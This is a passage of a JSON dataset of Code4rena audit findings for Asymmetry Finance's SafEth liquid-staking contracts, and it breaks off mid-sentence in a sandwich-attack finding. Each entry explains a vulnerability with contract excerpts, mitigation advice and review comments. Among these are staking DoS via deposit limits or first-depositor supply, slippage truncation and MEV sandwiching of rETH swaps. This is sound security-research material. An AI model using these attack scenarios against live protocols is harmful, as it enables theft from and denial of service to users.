`SafEth::stake()` or `WstEth::deposit()` functions. So if the function reverts, the stake function will all revert and it will not be possible to deposit to the other derivatives as well.\n\n**Another issue lies in the Reth contract having the same root cause below - Missing Validation & external tx dependency.**\n\nFor all the derivatives the stake function calls the derivative contract's `deposit()` function. Below is `rETH` contract's [`deposit()`](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L156-L204) function;\n\n```solidity\nfunction deposit() external payable onlyOwner returns (uint256) {\n    // Per RocketPool Docs query addresses each time it is used\n    address rocketDepositPoolAddress = RocketStorageInterface(\n        ROCKET_STORAGE_ADDRESS\n    ).getAddress(\n            keccak256(\n                abi.encodePacked(\"contract.address\", \"rocketDepositPool\")\n            )\n        );\n\n    RocketDepositPoolInterface rocketDepositPool = RocketDepositPoolInterface(\n            rocketDepositPoolAddress\n        );\n\n    if (!poolCanDeposit(msg.value)) {\n        uint rethPerEth = (10 ** 36) / poolPrice();\n\n        uint256 minOut = ((((rethPerEth * msg.value) / 10 ** 18) *\n            ((10 ** 18 - maxSlippage))) / 10 ** 18);\n\n        IWETH(W_ETH_ADDRESS).deposit{value: msg.value}();\n        uint256 amountSwapped = swapExactInputSingleHop(\n            W_ETH_ADDRESS,\n            rethAddress(),\n            500,\n            msg.value,\n            minOut\n        );\n\n        return amountSwapped;\n    } else {\n        address rocketTokenRETHAddress = RocketStorageInterface(\n            ROCKET_STORAGE_ADDRESS\n        ).getAddress(\n                keccak256(\n                    abi.encodePacked(\"contract.address\", \"rocketTokenRETH\")\n                )\n            );\n        RocketTokenRETHInterface rocketTokenRETH = RocketTokenRETHInterface(\n            rocketTokenRETHAddress\n        );\n        uint256 rethBalance1 = rocketTokenRETH.balanceOf(address(this));\n        rocketDepositPool.deposit{value: msg.value}();\n        uint256 rethBalance2 = rocketTokenRETH.balanceOf(address(this));\n        require(rethBalance2 > rethBalance1, \"No rETH was minted\");\n        uint256 rethMinted = rethBalance2 - rethBalance1;\n        return (rethMinted);\n    }\n}\n```\n\nAt [Line#170](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L170) it checks the pools availability to deposit with `poolCanDeposit(msg.value)`;\n\n[`PoolCanDeposit`](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L120-L150) function below;\n\n```solidity\nfunction poolCanDeposit(uint256 _amount) private view returns (bool) {\n    address rocketDepositPoolAddress = RocketStorageInterface(\n        ROCKET_STORAGE_ADDRESS\n    ).getAddress(\n            keccak256(\n                abi.encodePacked(\"contract.address\", \"rocketDepositPool\")\n            )\n        );\n    RocketDepositPoolInterface rocketDepositPool = RocketDepositPoolInterface(\n            rocketDepositPoolAddress\n        );\n    address rocketProtocolSettingsAddress = RocketStorageInterface(\n        ROCKET_STORAGE_ADDRESS\n    ).getAddress(\n            keccak256(\n                abi.encodePacked(\n                    \"contract.address\",\n                    \"rocketDAOProtocolSettingsDeposit\"\n                )\n            )\n        );\n    RocketDAOProtocolSettingsDepositInterface rocketDAOProtocolSettingsDeposit = RocketDAOProtocolSettingsDepositInterface(\n            rocketProtocolSettingsAddress\n        );\n    return\n        rocketDepositPool.getBalance() + _amount <=\n        rocketDAOProtocolSettingsDeposit.getMaximumDepositPoolSize() &&\n        _amount >= rocketDAOProtocolSettingsDeposit.getMinimumDeposit();\n}\n```\n\nHowever, as per Rocket Pool's [`RocketDepositPool`](https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/deposit/RocketDepositPool.sol#L77) contract, there is an other check to confirm the availability of the intended deposit;\n\n```solidity\nrequire(rocketDAOProtocolSettingsDeposit.getDepositEnabled(), \"Deposits into Rocket Pool are currently disabled\");\n```\n\nThe `Reth::deposit()` function doesn't check this requirement whether the deposits are disabled. As a result, the `SafEth::stake()` function will all revert and it will not be possible to deposit to the other derivatives as well.\n\n### Recommended Mitigation Steps\n\n1.  For WstETH contract; checking the daily limit via `getCurrentStakeLimit() >= amountToStake`\n2.  For Reth contract; Checking the Rocket Pool's deposit availability\n3.  Wrap the `stake()` function's iteration inside `try/catch` block to make the transaction success until it reverts.\n\n**[toshiSat (Asymmetry) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/812#issuecomment-1505625810):**\n > Only going to be implementing `#1`.\n\n**[Picodes (judge) decreased severity to Medium](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/812#issuecomment-1514691415)**\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed):**\n> Fixing it by enable/disable derivatives.<br>\n\n**Status:** Not mitigated. Full details in reports from [d3e4](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/64), [adriro](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/47), and [0x52](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/17) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `SafEth` contract's `stake()` function, which is the main entry point to add liquid Eth to the derivatives. The execution to deposit to the available derivative is done through iterating the derivatives mapping in `SafEthStorage` contract. The `stake()` function calls the derivative contract's `deposit()` function for all the derivatives. \n\nThe Lido protocol implements a daily staking limit both for `stETH` and `WstETH` as per their docs. However, this check was not done either in `SafEth::stake()` or `WstEth::deposit()` functions. So if the function reverts, the stake function will all revert and it will not be possible to deposit to the other derivatives as well.\n\nAnother issue lies in the Reth contract having the same root cause - Missing Validation & external tx dependency. At line#170, it checks the pools availability to deposit with `poolCanDeposit(msg.value)`; however, as per Rocket Pool's `RocketDepositPool` contract, there is an other check to confirm the availability of the intended deposit. The `Reth::deposit()` function doesn't check this requirement whether the deposits are disabled. As a result, the `SafEth::stake()` function will all revert and it will not be possible to deposit to the other derivatives as well.\n\nThe users will not be able to stake their funds and there will be loss of reputation.\n\nThe recommended mitigation steps are: 1. For WstETH contract; checking the daily limit via `getCurrentStakeLimit() >= amountToStake`; 2. For Reth contract; Checking the Rocket Pool's deposit availability; 3. Wrap the `stake()` function's iteration inside `try/catch` block to make the transaction success until it reverts.\n\nThe fix was initially disagreed with the severity, but later decreased to Medium. The mitigation was not fully implemented and the status is still 'Not mitigated'. Full details are in the reports from d3e4, adriro, and 0x52.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/812",
      "tags": [],
      "finders": [
        "codeislight",
        "d3e4",
        "HollaDieWaldfee",
        "volodya",
        "MiloTruck",
        "rbserver",
        "0xMirce",
        "0xbepresent",
        "ladboy233",
        "CodingNameKiki",
        "cryptonue",
        "Tricko",
        "shaka",
        "silviaxyz",
        "adriro",
        "Franfran"
      ]
    },
    {
      "id": "19927",
      "title": "[M-04] Lack of deadline for uniswap AMM",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L83-L102>\n\n### Proof of Concept\n\nThe ISwapRouter.exactInputSingle params (used in the rocketpool derivative) does not include a deadline currently.\n\n    ISwapRouter.ExactInputSingleParams memory params = ISwapRouter\n        .ExactInputSingleParams({\n            tokenIn: _tokenIn,\n            tokenOut: _tokenOut,\n            fee: _poolFee,\n            recipient: address(this),\n            amountIn: _amountIn,\n            amountOutMinimum: _minOut,\n            sqrtPriceLimitX96: 0\n        });\n\n<https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L83-L102>\n\nThe following scenario can happen:\n\n1.  User is staking and some/all the weight is in Reth.\n2.  The pool can't deposit eth, so uniswap will be used to convert eth to weth.\n3.  A validator holds the tx until it becomes advantageous due to some market condition (e.g. slippage or running his tx before and frontrun the original user stake).\n4.  This could potentially happen to a large amount of stakes, due to widespread usage of bots and MEV.\n\n### Impact\n\nBecause Front-running is a key aspect of AMM design, deadline is a useful tool to ensure that your tx cannot be saved for later.\n\nDue to the removal of the check, it may be more profitable for a validator to deny the transaction from being added until the transaction incurs the maximum amount of slippage.\n\n### Recommended Mitigation Steps\n\nThe `Reth.deposit()` function should accept a user-input `deadline` param that should be passed along to Reth.swapExactInputSingleHop() and ISwapRouter.exactInputSingle().\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed):**\n> Using swapTo/swapFrom directly from rocketpool.<br>\n\n**Status:** Not mitigated. Full details in reports from [d3e4](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/36), [adriro](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/45), and [0x52](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/16) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the ISwapRouter.exactInputSingle params (used in the rocketpool derivative) not including a deadline. This could potentially lead to a situation where a validator can hold the transaction until it becomes advantageous due to some market condition, such as slippage or frontrunning the original user stake. This could happen to a large amount of stakes due to widespread usage of bots and MEV.\n\nThe recommended mitigation step is for the `Reth.deposit()` function to accept a user-input `deadline` param that should be passed along to Reth.swapExactInputSingleHop() and ISwapRouter.exactInputSingle(). This mitigation has not yet been implemented, as detailed in reports from d3e4, adriro, and 0x52.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/932",
      "tags": [],
      "finders": [
        "BPZ",
        "SadBase",
        "SaeedAlipoor01988",
        "rbserver",
        "0xbepresent",
        "eyexploit",
        "ladboy233",
        "0xnev",
        "latt1ce",
        "brgltd",
        "peanuts",
        "Breeje",
        "0xepley",
        "Polaris\\_tow"
      ]
    },
    {
      "id": "19926",
      "title": "[M-03] Potential `stake()` DoS if sole safETH holder (ie: first depositor) unstakes `totalSupply` - 1",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L68-L81> <br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L98>\n\n### Impact\n\nPotential inability to stake (ie: DoS) if sole safETH user (ie: this would also make them the sole safETH holder) unstakes `totalSupply - 1`.\n\n### Proof of Concept\n\nThe goal of this POC is to prove that this line can revert <https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L98>\n\n            uint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice;\n\nThis can occur if the attacker can cause `preDepositPrice = 0`.\n\nA user who is the first staker will be the sole holder of 100% of `totalSupply` of safETH.\n\nThey can then unstake (and therefore burn) `totalSupply - 1` leaving a total of 1 wei of safETH in circulation.\n\nIn earlier lines in `stake()` <https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L77-L81>, we see\n\n            uint256 totalSupply = totalSupply();\n            uint256 preDepositPrice; // Price of safETH in regards to ETH\n            if (totalSupply == 0)\n                preDepositPrice = 10 ** 18; // initializes with a price of 1\n            else preDepositPrice = (10 ** 18 * underlyingValue) / totalSupply;\n\nWith `totalSupply = 1`, we see that the above code block will execute the `else` code path, and that if `underlyingValue = 0`, then `preDepositPrice = 0`.\n\n`underlyingValue` is set in earlier lines: <https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L68-L75>\n\n            uint256 underlyingValue = 0;\n\n            // Getting underlying value in terms of ETH for each derivative\n            for (uint i = 0; i < derivativeCount; i++)\n                underlyingValue +=\n                    (derivatives[i].ethPerDerivative(derivatives[i].balance()) *\n                        derivatives[i].balance()) /\n                    10 ** 18;\n\nFor a simple case, assume there is 1 derivative with 100% weight. Let's use rETH for this example since the derivative can get its `ethPerDerivative` price from an AMM. In this case:\n\n*   Assume the `ethPerDerivative()` value has been manipulated in the underlying AMM pool such that 1 derivative ETH is worth less than 1 ETH. eg: 1 rETH = 9.99...9e17 ETH\n*   In this case, also assume that since there is 1 wei of safETH circulating, there should be 1 wei of ETH staked through the protocol, and therefore `derivatives[i].balance() = 1 wei`.\n\nThis case will result in `underlyingValue += (9.99...9e17 * 1) / 10 ** 18 = 0`.\n\nWe can see that it is therefore possible to cause a divide by 0 revert and malfunction of the `stake()` function.\n\n### Recommended Mitigation Steps\n\nAssuming the deployment process will set up at least 1 derivative with a weight, simply adding a `stake()` operation of 0.5 ETH as the first depositor as part of the deployment process avoids the case where safETH totalSupply drops to 1 wei.\n\nOtherwise, within `unstake()` it is also possible to require that `totalSupply` does not fall between 0 and `minimumSupply` where `minimumSupply` is, for example, the configured `minAmount`.\n\n**[toshiSat (Asymmetry) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1016#issuecomment-1499721095):**\n > Seems like a pretty big edge case and it would leave the contract with basically no funds which doesn't seem like a High severity to me.\n\n**[Picodes (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1016#issuecomment-1511014172):**\n > Indeed, the described scenario isn't of high severity although the finding is valid. Basically, the first or last SafETH user could force the owner to redeploy, so downgrading to Medium. \n\n**[Asymmetry commented](https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#out-of-scope):**\n> Out of scope for mitigation review. We will be manually holding safETH to prevent this, if not redeploy.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a potential inability to stake (DoS) if the sole safETH user unstakes all but one of the totalSupply of safETH. This can occur if the attacker can cause preDepositPrice to become 0, which is possible if the underlyingValue is 0. This can be caused by manipulating the ethPerDerivative value in the underlying AMM pool such that 1 derivative ETH is worth less than 1 ETH.\n\nRecommended mitigation steps include adding a stake() operation of 0.5 ETH as the first depositor as part of the deployment process, or requiring that totalSupply does not fall between 0 and minimumSupply within unstake(). Asymmetry has commented that this is out of scope for mitigation review, and they will be manually holding safETH to prevent this, if not redeploy.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1016",
      "tags": [],
      "finders": [
        "whoismatthewmc1",
        "m\\_Rassska"
      ]
    },
    {
      "id": "19925",
      "title": "[M-02] sFrxEth may revert on redeeming non-zero amount",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L61-L65><br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L118>\n\n### Impact\n\nUnstaking is blocked.\n\n### Proof of Concept\n\nWhen unstaking the `withdraw` of each derivative is called. `SfrxEth.withdraw` calls [`IsFrxEth(SFRX_ETH_ADDRESS).redeem(_amount, address(this), address(this));`](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L61-L65). This function may revert if `_amount` is low due to the following line in `redeem` (where `_amount` is `shares`):<br>\n[`require((assets = previewRedeem(shares)) != 0, \"ZERO_ASSETS\");`](https://etherscan.io/token/0xac3e018457b222d93114458476f3e3416abbe38f#code#L708)<br>\n`previewRedeem(uint256 shares)` [returns `convertToAssets(shares)`](https://etherscan.io/token/0xac3e018457b222d93114458476f3e3416abbe38f#code#L753) which is the shares scaled by the division of total assets by total supply:<br>\n[`shares.mulDivDown(totalAssets(), supply)`](https://etherscan.io/token/0xac3e018457b222d93114458476f3e3416abbe38f#code#L733).<br>\nSo if `_amount == 1` and total assets in sFrxEth is less than its total supply, then `previewRedeem(shares) == 0` and `redeem` will revert. This revert in `SfrxEth.withdraw` causes a revert in `SafEth.unstake` at [L118](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L118), which means that funds cannot be unstaked.\n\n`_amount` may be as low as 1 when the weight for this derivative has been set to 0 and funds have adjusted over time through staking and unstaking until only 1 remains in the SfrxEth derivative. Instead of just being depleted it may thus block unstaking.\n\n### Recommended Mitigation Steps\n\nIn `SfrxEth.withdraw` check if `IsFrxEth(SFRX_ETH_ADDRESS).previewRedeem(_amount) == 0` and simply return if that's the case.\n\n**[elmutt (Asymmetry) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1049#issuecomment-1500678009):**\n > Valid, but feels like an extreme edge case so disagreeing with severity.\n\n**[Picodes (judge) decreased severity to Low and commented](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1049#issuecomment-1516739668):**\n > The same reasoning works when staking and is mitigated by the min amount. So when unstaking it makes sense to assume that users will unstake at least min amount. Downgrading to Low.\n\n**[d3e4 (warden) commented](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1049#issuecomment-1523947641):**\n > @Picodes - The amount unstaked from each derivative is a **percentage** of it's remaining balance. So if 50 % of the total supply of safEth is unstaked only 50 % of sFrxEth will be withdrawn, whether that be millions or just 1 out of 2 Wei remaining.<br>\n> In the scenario I provided (the weight of sFrxEth set to 0) **fractions** (not absolute amounts!) of the sFrxEth balance will be withdrawn and close to 0 it will decrease very slowly, eventually hitting 1.\n\n**[Picodes (judge) increased severity to Medium and commented](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1049#issuecomment-1525297943):**\n > @d3e4 - You are right and my previous comment was incorrect.\n> \n> The admin may set the weight of sFrxETH to 0, then the balance will slowly decrease, and eventually get very small and lead to this potential DOS. Starting with 1e18 sFrxETH, it'd take ~60 withdrawals of 50% of the SafEth supply to reach this zone.\n> \n> Note that adding the possibility to remove derivative would also solve this, so we could argue that this is linked to [`#703`](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/703).\n\n**[toshiSat (Asymmetry) commented](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1049#issuecomment-1525882438):**\n > We added an enable/disable to derivative so this will be fixed with that. This is a valid ticket.\n\n**[romeroadrian (warden) commented](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1049#issuecomment-1535316455):**\n > This is an excellent finding. \n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed):**\n> Fixing it by enable/disable derivatives.<br>\n\n**Status:** Not mitigated. Full details in reports from [adriro](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/43), [d3e4](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/63), and [0x52](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/15) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the code in the `SafEth` and `SfrxEth` contracts. When unstaking the `withdraw` of each derivative is called, which may revert if `_amount` is low due to the following line in `redeem`: `require((assets = previewRedeem(shares)) != 0, \"ZERO_ASSETS\")`. This means that if `_amount == 1` and total assets in sFrxEth is less than its total supply, then `previewRedeem(shares) == 0` and `redeem` will revert, blocking the unstaking of funds.\n\nThis issue can be caused when the weight for this derivative has been set to 0 and funds have adjusted over time through staking and unstaking until only 1 remains in the SfrxEth derivative. It was initially thought that this was an extreme edge case, but it was later realized that it could happen if the amount unstaked from each derivative is a percentage of it's remaining balance, and if the admin sets the weight of sFrxETH to 0.\n\nThe recommended mitigation step is to check if `IsFrxEth(SFRX_ETH_ADDRESS).previewRedeem(_amount) == 0` and simply return if that's the case. The Asymmetry team initially suggested fixing it by enable/disable derivatives, but this has not yet been mitigated. Full details can be found in reports from adriro, d3e4, and 0x52.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1049",
      "tags": [],
      "finders": [
        "d3e4"
      ]
    },
    {
      "id": "19924",
      "title": "[M-01] Division before multiplication truncate `minOut` and incurs heavy precision loss and result in insufficient slippage protection",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L173><br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L74>\n\nWhen Calcuting the minOut before doing trade, division before multiplication truncate minOut and incurs heavy precision loss, then very sub-optimal amount of the trade output can result in loss of fund from user because of the insufficient slippage protection.\n\n### Proof of Concept\n\nIn the current implementation, slippage can be set by calling\n\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L206>\n\n```solidity\n/**\n\t@notice - Sets the max slippage for a certain derivative index\n\t@param _derivativeIndex - index of the derivative you want to update the slippage\n\t@param _slippage - new slippage amount in wei\n*/\nfunction setMaxSlippage(\n\tuint _derivativeIndex,\n\tuint _slippage\n) external onlyOwner {\n\tderivatives[_derivativeIndex].setMaxSlippage(_slippage);\n\temit SetMaxSlippage(_derivativeIndex, _slippage);\n}\n```\n\nWhich calls the corresponding derivative contract.\n\n**Case 1**\n\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L58>\n\n```solidity\n/**\n\t@notice - Owner only function to set max slippage for derivative\n\t@param _slippage - new slippage amount in wei\n*/\nfunction setMaxSlippage(uint256 _slippage) external onlyOwner {\n\tmaxSlippage = _slippage;\n}\n```\n\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L173>\n\ncalling\n\n```solidity\nuint256 minOut = ((((rethPerEth * msg.value) / 10 ** 18) *\n\t((10 ** 18 - maxSlippage))) / 10 ** 18);\n\nIWETH(W_ETH_ADDRESS).deposit{value: msg.value}();\nuint256 amountSwapped = swapExactInputSingleHop(\n\tW_ETH_ADDRESS,\n\trethAddress(),\n\t500,\n\tmsg.value,\n\tminOut\n);\n```\n\nAs we can see, the division before multiplication happens in the line of code.\n\n```solidity\nuint256 minOut = ((((rethPerEth * msg.value) / 10 ** 18) *\n\t((10 ** 18 - maxSlippage))) / 10 ** 18);\n```\n\nFor example, if maxSlippage is 10 &ast;&ast; 17\n\n(10 &ast;&ast; 18 - 10 &ast;&ast; 17) / (10 &ast;&ast; 18) = 0\n\nThen minOut is 0, slippage control is disabled because of the division before multipcation.\n\n**Case 2**\n\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L51>\n\n```solidity\n/**\n\t@notice - Owner only function to set max slippage for derivative\n*/\nfunction setMaxSlippage(uint256 _slippage) external onlyOwner {\n\tmaxSlippage = _slippage;\n}\n```\n\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L74>\n\nThe divison before multiplication happens below.\n\n```solidity\nuint256 minOut = (((ethPerDerivative(_amount) * _amount) / 10 ** 18) *\n\t(10 ** 18 - maxSlippage)) / 10 ** 18;\n\nIFrxEthEthPool(FRX_ETH_CRV_POOL_ADDRESS).exchange(\n\t1,\n\t0,\n\tfrxEthBalance,\n\tminOut\n);\n```\n\nFor example, if maxSlippage is 10 &ast;&ast; 17\n\n(10 &ast;&ast; 18 - 10 &ast;&ast; 17) / (10 &ast;&ast; 18) = 0\n\nThen minOut is 0, slippage control is disabled because of the division before multiplication.\n\n### Recommended Mitigation Steps\n\nWe recommend the protocol avoid division before multiplcation when calcaluting the minOut to enable slippage protection and avoid front-running.\n\n**[toshiSat (Asymmetry) acknowledged, but disagreed with severity and commented via duplicate issue `#1044`](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1044#issuecomment-1499716993):**\n> QA, I'm not seeing the precision errors.\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1078#issuecomment-1518592906):**\n > Note that there is a multiplication before the division, so the loss of precision is significant only if `msg.value` is small.\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed):**\n> Don't divide before multiply.<br>\n\n**Status:** Not fully mitigated. Full details in reports from [d3e4](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/59) and [adriro](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/77) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a precision loss issue when calculating the minOut before doing a trade in the contracts Reth.sol and SfrxEth.sol. The issue occurs when the division before multiplication truncates minOut and results in a very sub-optimal amount of the trade output, which can cause a loss of fund from the user due to insufficient slippage protection.\n\nThe current implementation allows slippage to be set by calling the setMaxSlippage() function. In the case of Reth.sol, the division before multiplication happens in the line of code:\n\n```solidity\nuint256 minOut = ((((rethPerEth * msg.value) / 10 ** 18) *\n\t((10 ** 18 - maxSlippage))) / 10 ** 18);\n```\n\nFor example, if maxSlippage is 10 &ast;&ast; 17, then minOut is 0, resulting in slippage control being disabled. In the case of SfrxEth.sol, the division before multiplication happens in the line of code:\n\n```solidity\nuint256 minOut = (((ethPerDerivative(_amount) * _amount) / 10 ** 18) *\n\t(10 ** 18 - maxSlippage)) / 10 ** 18;\n```\n\nFor example, if maxSlippage is 10 &ast;&ast; 17, then minOut is 0, resulting in slippage control being disabled.\n\nThe recommended mitigation steps for this issue are to avoid division before multiplication when calculating the minOut in order to enable slippage protection and avoid front-running. The mitigation has not been fully implemented yet, with full details in reports from d3e4 and adriro.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1078",
      "tags": [],
      "finders": [
        "Bauer",
        "J4de",
        "juancito",
        "jasonxiale",
        "0xnev",
        "ladboy233",
        "koxuan",
        "0xkazim",
        "Matin",
        "latt1ce",
        "UniversalCrypto",
        "cryptothemex",
        "neumo"
      ]
    },
    {
      "id": "19923",
      "title": "[H-08] Staking, unstaking and rebalanceToWeight can be sandwiched (Mainly rETH deposit)",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L63-L101> <br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L228-L245> <br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L170-L183> <br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/WstEth.sol#L56-L66> <br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L108-L128> <br>\n<https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L74-L75>\n\n### Impact\n\nrETH derivative can be bought through uniswap if the deposit contract is not open.\n\nWhile a maxSlippage variable is set, the price of rETH on uniswap is the spot price and is only determined during the transaction opening sandwich opportunity for MEV researchers as long as the slippage stays below maxSlippage.\n\nThis is also true for WstETH (on withdraw) and frxETH (on deposit and withdraw) that go through a curve pool when unstaking (and staking for frxETH). While the curve pool has much more liquidity and the assumed price is a 1 - 1 ratio for WstETH and frxETH seem to be using a twap price before applying the slippage, these attacks are less likely to happen so I will only describe rETH.\n\n### Proof of Concept\n\nWhile the current rETH derivative contract uses uniswapv3 0,05% pool, I'll be using the uniswapv2 formula (<https://amm-calculator.vercel.app/>) to make this example simplier, in both case sandwiching is possible.\n\nDefault slippage is set to 1% on rETH contract at deployment. (see: <https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L44>)\n\nLet's take a pool of 10,000 rETH for 10,695 eth (same ratio is on the univ3 0,05% pool on the 26th of march).\n\nUser wants to stake 100ETH, a third of it will be staked through rETH according to a 1/3 weight for each derivative.\n\nBundle:\n\nTX1:\n\nResearcher swap 100 ETH in for 92.63 rETH<br>\nnew pool balance: 9907.36 rETH - 10795 ETH\n\nTX2:\n\nUser stake his ETH, the rocketPool deposit contract is close so the deposit function takes the current spot price of the pool and then applies 1% 